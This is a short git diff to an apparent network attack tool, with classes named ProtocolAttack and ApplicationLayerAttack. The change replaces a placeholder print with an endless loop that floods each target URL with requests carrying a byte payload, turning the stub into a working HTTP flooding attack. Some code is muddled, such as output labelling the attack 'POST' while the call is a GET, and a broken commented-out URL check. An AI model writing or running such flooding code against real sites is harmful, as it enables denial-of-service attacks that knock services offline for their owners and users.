@@ -151,7 +151,6 @@ class ProtocolAttack:
                 except ValueError as e:
                     print(f"Invalid port: {e}")
                     return
-                
             else:
                 ssport = RandShort()
             
@@ -182,8 +181,14 @@ class ApplicationLayerAttack:
 
     @staticmethod
     def get(vector: list, bye: bytes):
-        print(f"GET attack on {vector} with {len(bye)} bytes")
-@function
-def get (vector: list, bye: bytes):
-        print(f"GET attack on {vector} with {len(bye)} bytes") ; 
-    
+        # for i in vector:    
+            # if 'http' is not i or 'https' is not in i:
+                    # print("u missed the url, type it again")
+        print(f"POST attack on {vector} with {len(bye)} bytes")
+        print("Using POST method to:", vector)
+        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
+        time.sleep(10)
+        while True:
+            for target in vector:
+                response = res.get(target, data=bye)
+                print(response.text)
